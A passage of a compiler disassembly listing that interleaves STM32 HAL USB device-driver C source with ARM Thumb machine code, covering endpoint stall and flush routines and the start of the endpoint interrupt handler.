 80023f2:	f005 febb 	bl	800816c <USB_EPSetStall>

  if ((ep_addr & EP_ADDR_MSK) == 0U)
 80023f6:	78fb      	ldrb	r3, [r7, #3]
 80023f8:	f003 0307 	and.w	r3, r3, #7
 80023fc:	2b00      	cmp	r3, #0
 80023fe:	d108      	bne.n	8002412 <HAL_PCD_EP_SetStall+0xae>
  {
    (void)USB_EP0_OutStart(hpcd->Instance, (uint8_t *)hpcd->Setup);
 8002400:	687b      	ldr	r3, [r7, #4]
 8002402:	681a      	ldr	r2, [r3, #0]
 8002404:	687b      	ldr	r3, [r7, #4]
 8002406:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 800240a:	4619      	mov	r1, r3
 800240c:	4610      	mov	r0, r2
 800240e:	f005 fffc 	bl	800840a <USB_EP0_OutStart>
  }

  __HAL_UNLOCK(hpcd);
 8002412:	687b      	ldr	r3, [r7, #4]
 8002414:	2200      	movs	r2, #0
 8002416:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 800241a:	2300      	movs	r3, #0
}
 800241c:	4618      	mov	r0, r3
 800241e:	3710      	adds	r7, #16
 8002420:	46bd      	mov	sp, r7
 8002422:	bd80      	pop	{r7, pc}

08002424 <HAL_PCD_EP_ClrStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_ClrStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002424:	b580      	push	{r7, lr}
 8002426:	b084      	sub	sp, #16
 8002428:	af00      	add	r7, sp, #0
 800242a:	6078      	str	r0, [r7, #4]
 800242c:	460b      	mov	r3, r1
 800242e:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & 0x0FU) > hpcd->Init.dev_endpoints)
 8002430:	78fb      	ldrb	r3, [r7, #3]
 8002432:	f003 020f 	and.w	r2, r3, #15
 8002436:	687b      	ldr	r3, [r7, #4]
 8002438:	685b      	ldr	r3, [r3, #4]
 800243a:	429a      	cmp	r2, r3
 800243c:	d901      	bls.n	8002442 <HAL_PCD_EP_ClrStall+0x1e>
  {
    return HAL_ERROR;
 800243e:	2301      	movs	r3, #1
 8002440:	e040      	b.n	80024c4 <HAL_PCD_EP_ClrStall+0xa0>
  }

  if ((0x80U & ep_addr) == 0x80U)
 8002442:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002446:	2b00      	cmp	r3, #0
 8002448:	da0e      	bge.n	8002468 <HAL_PCD_EP_ClrStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800244a:	78fb      	ldrb	r3, [r7, #3]
 800244c:	f003 0307 	and.w	r3, r3, #7
 8002450:	1c5a      	adds	r2, r3, #1
 8002452:	4613      	mov	r3, r2
 8002454:	009b      	lsls	r3, r3, #2
 8002456:	4413      	add	r3, r2
 8002458:	00db      	lsls	r3, r3, #3
 800245a:	687a      	ldr	r2, [r7, #4]
 800245c:	4413      	add	r3, r2
 800245e:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002460:	68fb      	ldr	r3, [r7, #12]
 8002462:	2201      	movs	r2, #1
 8002464:	705a      	strb	r2, [r3, #1]
 8002466:	e00e      	b.n	8002486 <HAL_PCD_EP_ClrStall+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002468:	78fb      	ldrb	r3, [r7, #3]
 800246a:	f003 0207 	and.w	r2, r3, #7
 800246e:	4613      	mov	r3, r2
 8002470:	009b      	lsls	r3, r3, #2
 8002472:	4413      	add	r3, r2
 8002474:	00db      	lsls	r3, r3, #3
 8002476:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800247a:	687a      	ldr	r2, [r7, #4]
 800247c:	4413      	add	r3, r2
 800247e:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 8002480:	68fb      	ldr	r3, [r7, #12]
 8002482:	2200      	movs	r2, #0
 8002484:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 0U;
 8002486:	68fb      	ldr	r3, [r7, #12]
 8002488:	2200      	movs	r2, #0
 800248a:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 800248c:	78fb      	ldrb	r3, [r7, #3]
 800248e:	f003 0307 	and.w	r3, r3, #7
 8002492:	b2da      	uxtb	r2, r3
 8002494:	68fb      	ldr	r3, [r7, #12]
 8002496:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 8002498:	687b      	ldr	r3, [r7, #4]
 800249a:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 800249e:	2b01      	cmp	r3, #1
 80024a0:	d101      	bne.n	80024a6 <HAL_PCD_EP_ClrStall+0x82>
 80024a2:	2302      	movs	r3, #2
 80024a4:	e00e      	b.n	80024c4 <HAL_PCD_EP_ClrStall+0xa0>
 80024a6:	687b      	ldr	r3, [r7, #4]
 80024a8:	2201      	movs	r2, #1
 80024aa:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_EPClearStall(hpcd->Instance, ep);
 80024ae:	687b      	ldr	r3, [r7, #4]
 80024b0:	681b      	ldr	r3, [r3, #0]
 80024b2:	68f9      	ldr	r1, [r7, #12]
 80024b4:	4618      	mov	r0, r3
 80024b6:	f005 feaa 	bl	800820e <USB_EPClearStall>
  __HAL_UNLOCK(hpcd);
 80024ba:	687b      	ldr	r3, [r7, #4]
 80024bc:	2200      	movs	r2, #0
 80024be:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 80024c2:	2300      	movs	r3, #0
}
 80024c4:	4618      	mov	r0, r3
 80024c6:	3710      	adds	r7, #16
 80024c8:	46bd      	mov	sp, r7
 80024ca:	bd80      	pop	{r7, pc}

080024cc <HAL_PCD_EP_Flush>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Flush(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 80024cc:	b580      	push	{r7, lr}
 80024ce:	b082      	sub	sp, #8
 80024d0:	af00      	add	r7, sp, #0
 80024d2:	6078      	str	r0, [r7, #4]
 80024d4:	460b      	mov	r3, r1
 80024d6:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 80024d8:	687b      	ldr	r3, [r7, #4]
 80024da:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80024de:	2b01      	cmp	r3, #1
 80024e0:	d101      	bne.n	80024e6 <HAL_PCD_EP_Flush+0x1a>
 80024e2:	2302      	movs	r3, #2
 80024e4:	e01b      	b.n	800251e <HAL_PCD_EP_Flush+0x52>
 80024e6:	687b      	ldr	r3, [r7, #4]
 80024e8:	2201      	movs	r2, #1
 80024ea:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  if ((ep_addr & 0x80U) == 0x80U)
 80024ee:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80024f2:	2b00      	cmp	r3, #0
 80024f4:	da09      	bge.n	800250a <HAL_PCD_EP_Flush+0x3e>
  {
    (void)USB_FlushTxFifo(hpcd->Instance, (uint32_t)ep_addr & EP_ADDR_MSK);
 80024f6:	687b      	ldr	r3, [r7, #4]
 80024f8:	681a      	ldr	r2, [r3, #0]
 80024fa:	78fb      	ldrb	r3, [r7, #3]
 80024fc:	f003 0307 	and.w	r3, r3, #7
 8002500:	4619      	mov	r1, r3
 8002502:	4610      	mov	r0, r2
 8002504:	f003 fcb8 	bl	8005e78 <USB_FlushTxFifo>
 8002508:	e004      	b.n	8002514 <HAL_PCD_EP_Flush+0x48>
  }
  else
  {
    (void)USB_FlushRxFifo(hpcd->Instance);
 800250a:	687b      	ldr	r3, [r7, #4]
 800250c:	681b      	ldr	r3, [r3, #0]
 800250e:	4618      	mov	r0, r3
 8002510:	f003 fcbe 	bl	8005e90 <USB_FlushRxFifo>
  }

  __HAL_UNLOCK(hpcd);
 8002514:	687b      	ldr	r3, [r7, #4]
 8002516:	2200      	movs	r2, #0
 8002518:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 800251c:	2300      	movs	r3, #0
}
 800251e:	4618      	mov	r0, r3
 8002520:	3708      	adds	r7, #8
 8002522:	46bd      	mov	sp, r7
 8002524:	bd80      	pop	{r7, pc}

08002526 <PCD_EP_ISR_Handler>:
  * @brief  This function handles PCD Endpoint interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
static HAL_StatusTypeDef PCD_EP_ISR_Handler(PCD_HandleTypeDef *hpcd)
{
 8002526:	b580      	push	{r7, lr}
 8002528:	b096      	sub	sp, #88	; 0x58
 800252a:	af00      	add	r7, sp, #0
 800252c:	6078      	str	r0, [r7, #4]
#if (USE_USB_DOUBLE_BUFFER != 1U)
  count = 0U;
#endif /* USE_USB_DOUBLE_BUFFER */

  /* stay in loop while pending interrupts */
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 800252e:	e3b1      	b.n	8002c94 <PCD_EP_ISR_Handler+0x76e>
  {
    wIstr = hpcd->Instance->ISTR;
 8002530:	687b      	ldr	r3, [r7, #4]
 8002532:	681b      	ldr	r3, [r3, #0]
 8002534:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002538:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e

    /* extract highest priority endpoint number */
    epindex = (uint8_t)(wIstr & USB_ISTR_EP_ID);
 800253c:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8002540:	b2db      	uxtb	r3, r3
 8002542:	f003 030f 	and.w	r3, r3, #15
 8002546:	f887 304d 	strb.w	r3, [r7, #77]	; 0x4d

    if (epindex == 0U)
 800254a:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 800254e:	2b00      	cmp	r3, #0
 8002550:	f040 8173 	bne.w	800283a <PCD_EP_ISR_Handler+0x314>
    {
      /* Decode and service control endpoint interrupt */

      /* DIR bit = origin of the interrupt */
      if ((wIstr & USB_ISTR_DIR) == 0U)
 8002554:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8002558:	f003 0310 	and.w	r3, r3, #16
 800255c:	2b00      	cmp	r3, #0
 800255e:	d150      	bne.n	8002602 <PCD_EP_ISR_Handler+0xdc>
      {
        /* DIR = 0 */

        /* DIR = 0 => IN  int */
        /* DIR = 0 implies that (EP_CTR_TX = 1) always */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002560:	687b      	ldr	r3, [r7, #4]
 8002562:	681b      	ldr	r3, [r3, #0]
 8002564:	881b      	ldrh	r3, [r3, #0]
 8002566:	b29b      	uxth	r3, r3
 8002568:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 800256c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002570:	81fb      	strh	r3, [r7, #14]
 8002572:	687b      	ldr	r3, [r7, #4]
 8002574:	681a      	ldr	r2, [r3, #0]
 8002576:	89fb      	ldrh	r3, [r7, #14]
 8002578:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800257c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002580:	b29b      	uxth	r3, r3
 8002582:	8013      	strh	r3, [r2, #0]
        ep = &hpcd->IN_ep[0];
 8002584:	687b      	ldr	r3, [r7, #4]
 8002586:	3328      	adds	r3, #40	; 0x28
 8002588:	657b      	str	r3, [r7, #84]	; 0x54

        ep->xfer_count = PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 800258a:	687b      	ldr	r3, [r7, #4]
 800258c:	681b      	ldr	r3, [r3, #0]
 800258e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002592:	b29b      	uxth	r3, r3
 8002594:	461a      	mov	r2, r3
 8002596:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002598:	781b      	ldrb	r3, [r3, #0]
 800259a:	00db      	lsls	r3, r3, #3
 800259c:	4413      	add	r3, r2
 800259e:	687a      	ldr	r2, [r7, #4]
 80025a0:	6812      	ldr	r2, [r2, #0]
 80025a2:	4413      	add	r3, r2
 80025a4:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80025a8:	881b      	ldrh	r3, [r3, #0]
 80025aa:	f3c3 0209 	ubfx	r2, r3, #0, #10
 80025ae:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025b0:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += ep->xfer_count;
 80025b2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025b4:	695a      	ldr	r2, [r3, #20]
 80025b6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025b8:	69db      	ldr	r3, [r3, #28]
 80025ba:	441a      	add	r2, r3
 80025bc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025be:	615a      	str	r2, [r3, #20]

        /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
        hpcd->DataInStageCallback(hpcd, 0U);
#else
        HAL_PCD_DataInStageCallback(hpcd, 0U);
 80025c0:	2100      	movs	r1, #0
 80025c2:	6878      	ldr	r0, [r7, #4]
 80025c4:	f00a f98f 	bl	800c8e6 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

        if ((hpcd->USB_Address > 0U) && (ep->xfer_len == 0U))
 80025c8:	687b      	ldr	r3, [r7, #4]
 80025ca:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80025ce:	b2db      	uxtb	r3, r3
 80025d0:	2b00      	cmp	r3, #0
 80025d2:	f000 835f 	beq.w	8002c94 <PCD_EP_ISR_Handler+0x76e>
 80025d6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025d8:	699b      	ldr	r3, [r3, #24]
 80025da:	2b00      	cmp	r3, #0
 80025dc:	f040 835a 	bne.w	8002c94 <PCD_EP_ISR_Handler+0x76e>
        {
          hpcd->Instance->DADDR = ((uint16_t)hpcd->USB_Address | USB_DADDR_EF);
 80025e0:	687b      	ldr	r3, [r7, #4]
 80025e2:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80025e6:	b2db      	uxtb	r3, r3
 80025e8:	f063 037f 	orn	r3, r3, #127	; 0x7f
 80025ec:	b2da      	uxtb	r2, r3
 80025ee:	687b      	ldr	r3, [r7, #4]
 80025f0:	681b      	ldr	r3, [r3, #0]
 80025f2:	b292      	uxth	r2, r2
 80025f4:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
          hpcd->USB_Address = 0U;
 80025f8:	687b      	ldr	r3, [r7, #4]
 80025fa:	2200      	movs	r2, #0
 80025fc:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8002600:	e348      	b.n	8002c94 <PCD_EP_ISR_Handler+0x76e>
      {
        /* DIR = 1 */

        /* DIR = 1 & CTR_RX => SETUP or OUT int */
        /* DIR = 1 & (CTR_TX | CTR_RX) => 2 int pending */
        ep = &hpcd->OUT_ep[0];
 8002602:	687b      	ldr	r3, [r7, #4]
 8002604:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002608:	657b      	str	r3, [r7, #84]	; 0x54
        wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 800260a:	687b      	ldr	r3, [r7, #4]
 800260c:	681b      	ldr	r3, [r3, #0]
 800260e:	881b      	ldrh	r3, [r3, #0]
 8002610:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

        if ((wEPVal & USB_EP_SETUP) != 0U)
 8002614:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002618:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 800261c:	2b00      	cmp	r3, #0
 800261e:	d032      	beq.n	8002686 <PCD_EP_ISR_Handler+0x160>
        {
          /* Get SETUP Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 8002620:	687b      	ldr	r3, [r7, #4]
 8002622:	681b      	ldr	r3, [r3, #0]
 8002624:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002628:	b29b      	uxth	r3, r3
 800262a:	461a      	mov	r2, r3
 800262c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800262e:	781b      	ldrb	r3, [r3, #0]
 8002630:	00db      	lsls	r3, r3, #3
 8002632:	4413      	add	r3, r2
 8002634:	687a      	ldr	r2, [r7, #4]
 8002636:	6812      	ldr	r2, [r2, #0]
 8002638:	4413      	add	r3, r2
 800263a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800263e:	881b      	ldrh	r3, [r3, #0]
 8002640:	f3c3 0209 	ubfx	r2, r3, #0, #10
 8002644:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002646:	61da      	str	r2, [r3, #28]

          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 8002648:	687b      	ldr	r3, [r7, #4]
 800264a:	6818      	ldr	r0, [r3, #0]
 800264c:	687b      	ldr	r3, [r7, #4]
 800264e:	f503 712c 	add.w	r1, r3, #688	; 0x2b0
 8002652:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002654:	88da      	ldrh	r2, [r3, #6]
                      ep->pmaadress, (uint16_t)ep->xfer_count);
 8002656:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002658:	69db      	ldr	r3, [r3, #28]
          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 800265a:	b29b      	uxth	r3, r3
 800265c:	f005 ff23 	bl	80084a6 <USB_ReadPMA>

          /* SETUP bit kept frozen while CTR_RX = 1 */
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002660:	687b      	ldr	r3, [r7, #4]
 8002662:	681b      	ldr	r3, [r3, #0]
 8002664:	881b      	ldrh	r3, [r3, #0]
 8002666:	b29a      	uxth	r2, r3
 8002668:	f640 738f 	movw	r3, #3983	; 0xf8f
 800266c:	4013      	ands	r3, r2
 800266e:	823b      	strh	r3, [r7, #16]
 8002670:	687b      	ldr	r3, [r7, #4]
 8002672:	681b      	ldr	r3, [r3, #0]
 8002674:	8a3a      	ldrh	r2, [r7, #16]
 8002676:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 800267a:	b292      	uxth	r2, r2
 800267c:	801a      	strh	r2, [r3, #0]

          /* Process SETUP Packet*/
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->SetupStageCallback(hpcd);
#else
          HAL_PCD_SetupStageCallback(hpcd);
 800267e:	6878      	ldr	r0, [r7, #4]
 8002680:	f00a f904 	bl	800c88c <HAL_PCD_SetupStageCallback>
 8002684:	e306      	b.n	8002c94 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else if ((wEPVal & USB_EP_CTR_RX) != 0U)
 8002686:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 800268a:	2b00      	cmp	r3, #0
 800268c:	f280 8302 	bge.w	8002c94 <PCD_EP_ISR_Handler+0x76e>
        {
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002690:	687b      	ldr	r3, [r7, #4]
 8002692:	681b      	ldr	r3, [r3, #0]
 8002694:	881b      	ldrh	r3, [r3, #0]
 8002696:	b29a      	uxth	r2, r3
 8002698:	f640 738f 	movw	r3, #3983	; 0xf8f
 800269c:	4013      	ands	r3, r2
 800269e:	83fb      	strh	r3, [r7, #30]
 80026a0:	687b      	ldr	r3, [r7, #4]
 80026a2:	681b      	ldr	r3, [r3, #0]
 80026a4:	8bfa      	ldrh	r2, [r7, #30]
 80026a6:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 80026aa:	b292      	uxth	r2, r2
 80026ac:	801a      	strh	r2, [r3, #0]

          /* Get Control Data OUT Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 80026ae:	687b      	ldr	r3, [r7, #4]
 80026b0:	681b      	ldr	r3, [r3, #0]
 80026b2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80026b6:	b29b      	uxth	r3, r3
 80026b8:	461a      	mov	r2, r3
 80026ba:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026bc:	781b      	ldrb	r3, [r3, #0]
 80026be:	00db      	lsls	r3, r3, #3
 80026c0:	4413      	add	r3, r2
 80026c2:	687a      	ldr	r2, [r7, #4]
 80026c4:	6812      	ldr	r2, [r2, #0]
 80026c6:	4413      	add	r3, r2
 80026c8:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80026cc:	881b      	ldrh	r3, [r3, #0]
 80026ce:	f3c3 0209 	ubfx	r2, r3, #0, #10
 80026d2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026d4:	61da      	str	r2, [r3, #28]

          if ((ep->xfer_count != 0U) && (ep->xfer_buff != 0U))
 80026d6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026d8:	69db      	ldr	r3, [r3, #28]
 80026da:	2b00      	cmp	r3, #0
 80026dc:	d019      	beq.n	8002712 <PCD_EP_ISR_Handler+0x1ec>
 80026de:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026e0:	695b      	ldr	r3, [r3, #20]
 80026e2:	2b00      	cmp	r3, #0
 80026e4:	d015      	beq.n	8002712 <PCD_EP_ISR_Handler+0x1ec>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 80026e6:	687b      	ldr	r3, [r7, #4]
 80026e8:	6818      	ldr	r0, [r3, #0]
 80026ea:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026ec:	6959      	ldr	r1, [r3, #20]
 80026ee:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026f0:	88da      	ldrh	r2, [r3, #6]
                        ep->pmaadress, (uint16_t)ep->xfer_count);
 80026f2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026f4:	69db      	ldr	r3, [r3, #28]
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 80026f6:	b29b      	uxth	r3, r3
 80026f8:	f005 fed5 	bl	80084a6 <USB_ReadPMA>

            ep->xfer_buff += ep->xfer_count;
 80026fc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026fe:	695a      	ldr	r2, [r3, #20]
 8002700:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002702:	69db      	ldr	r3, [r3, #28]
 8002704:	441a      	add	r2, r3
 8002706:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002708:	615a      	str	r2, [r3, #20]

            /* Process Control Data OUT Packet */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
            hpcd->DataOutStageCallback(hpcd, 0U);
#else
            HAL_PCD_DataOutStageCallback(hpcd, 0U);
 800270a:	2100      	movs	r1, #0
 800270c:	6878      	ldr	r0, [r7, #4]
 800270e:	f00a f8cf 	bl	800c8b0 <HAL_PCD_DataOutStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
          }

          wEPVal = (uint16_t)PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 8002712:	687b      	ldr	r3, [r7, #4]
 8002714:	681b      	ldr	r3, [r3, #0]
 8002716:	881b      	ldrh	r3, [r3, #0]
 8002718:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

          if (((wEPVal & USB_EP_SETUP) == 0U) && ((wEPVal & USB_EP_RX_STRX) != USB_EP_RX_VALID))
 800271c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002720:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8002724:	2b00      	cmp	r3, #0
 8002726:	f040 82b5 	bne.w	8002c94 <PCD_EP_ISR_Handler+0x76e>
 800272a:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 800272e:	f403 5340 	and.w	r3, r3, #12288	; 0x3000
 8002732:	f5b3 5f40 	cmp.w	r3, #12288	; 0x3000
 8002736:	f000 82ad 	beq.w	8002c94 <PCD_EP_ISR_Handler+0x76e>
          {
            PCD_SET_EP_RX_CNT(hpcd->Instance, PCD_ENDP0, ep->maxpacket);
 800273a:	687b      	ldr	r3, [r7, #4]
 800273c:	681b      	ldr	r3, [r3, #0]
 800273e:	61bb      	str	r3, [r7, #24]
 8002740:	687b      	ldr	r3, [r7, #4]
 8002742:	681b      	ldr	r3, [r3, #0]
 8002744:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002748:	b29b      	uxth	r3, r3
 800274a:	461a      	mov	r2, r3
 800274c:	69bb      	ldr	r3, [r7, #24]
 800274e:	4413      	add	r3, r2
 8002750:	61bb      	str	r3, [r7, #24]
 8002752:	69bb      	ldr	r3, [r7, #24]
 8002754:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002758:	617b      	str	r3, [r7, #20]
 800275a:	697b      	ldr	r3, [r7, #20]
 800275c:	881b      	ldrh	r3, [r3, #0]
 800275e:	b29b      	uxth	r3, r3
 8002760:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002764:	b29a      	uxth	r2, r3
 8002766:	697b      	ldr	r3, [r7, #20]
 8002768:	801a      	strh	r2, [r3, #0]
 800276a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800276c:	691b      	ldr	r3, [r3, #16]
 800276e:	2b3e      	cmp	r3, #62	; 0x3e
 8002770:	d91d      	bls.n	80027ae <PCD_EP_ISR_Handler+0x288>
 8002772:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002774:	691b      	ldr	r3, [r3, #16]
 8002776:	095b      	lsrs	r3, r3, #5
 8002778:	647b      	str	r3, [r7, #68]	; 0x44
 800277a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800277c:	691b      	ldr	r3, [r3, #16]
 800277e:	f003 031f 	and.w	r3, r3, #31
 8002782:	2b00      	cmp	r3, #0
 8002784:	d102      	bne.n	800278c <PCD_EP_ISR_Handler+0x266>
 8002786:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002788:	3b01      	subs	r3, #1
 800278a:	647b      	str	r3, [r7, #68]	; 0x44
 800278c:	697b      	ldr	r3, [r7, #20]
 800278e:	881b      	ldrh	r3, [r3, #0]
 8002790:	b29a      	uxth	r2, r3
 8002792:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002794:	b29b      	uxth	r3, r3
 8002796:	029b      	lsls	r3, r3, #10
 8002798:	b29b      	uxth	r3, r3
 800279a:	4313      	orrs	r3, r2
 800279c:	b29b      	uxth	r3, r3
 800279e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80027a2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80027a6:	b29a      	uxth	r2, r3
 80027a8:	697b      	ldr	r3, [r7, #20]
 80027aa:	801a      	strh	r2, [r3, #0]
 80027ac:	e026      	b.n	80027fc <PCD_EP_ISR_Handler+0x2d6>
 80027ae:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027b0:	691b      	ldr	r3, [r3, #16]
 80027b2:	2b00      	cmp	r3, #0
 80027b4:	d10a      	bne.n	80027cc <PCD_EP_ISR_Handler+0x2a6>
 80027b6:	697b      	ldr	r3, [r7, #20]
 80027b8:	881b      	ldrh	r3, [r3, #0]
 80027ba:	b29b      	uxth	r3, r3
 80027bc:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80027c0:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80027c4:	b29a      	uxth	r2, r3
 80027c6:	697b      	ldr	r3, [r7, #20]
 80027c8:	801a      	strh	r2, [r3, #0]
 80027ca:	e017      	b.n	80027fc <PCD_EP_ISR_Handler+0x2d6>
 80027cc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027ce:	691b      	ldr	r3, [r3, #16]
 80027d0:	085b      	lsrs	r3, r3, #1
 80027d2:	647b      	str	r3, [r7, #68]	; 0x44
 80027d4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027d6:	691b      	ldr	r3, [r3, #16]
 80027d8:	f003 0301 	and.w	r3, r3, #1
 80027dc:	2b00      	cmp	r3, #0
 80027de:	d002      	beq.n	80027e6 <PCD_EP_ISR_Handler+0x2c0>
 80027e0:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80027e2:	3301      	adds	r3, #1
 80027e4:	647b      	str	r3, [r7, #68]	; 0x44
 80027e6:	697b      	ldr	r3, [r7, #20]
 80027e8:	881b      	ldrh	r3, [r3, #0]
 80027ea:	b29a      	uxth	r2, r3
 80027ec:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80027ee:	b29b      	uxth	r3, r3
 80027f0:	029b      	lsls	r3, r3, #10
 80027f2:	b29b      	uxth	r3, r3
 80027f4:	4313      	orrs	r3, r2
 80027f6:	b29a      	uxth	r2, r3
 80027f8:	697b      	ldr	r3, [r7, #20]
 80027fa:	801a      	strh	r2, [r3, #0]
            PCD_SET_EP_RX_STATUS(hpcd->Instance, PCD_ENDP0, USB_EP_RX_VALID);
 80027fc:	687b      	ldr	r3, [r7, #4]
 80027fe:	681b      	ldr	r3, [r3, #0]
 8002800:	881b      	ldrh	r3, [r3, #0]
 8002802:	b29b      	uxth	r3, r3
 8002804:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002808:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800280c:	827b      	strh	r3, [r7, #18]
 800280e:	8a7b      	ldrh	r3, [r7, #18]
 8002810:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8002814:	827b      	strh	r3, [r7, #18]
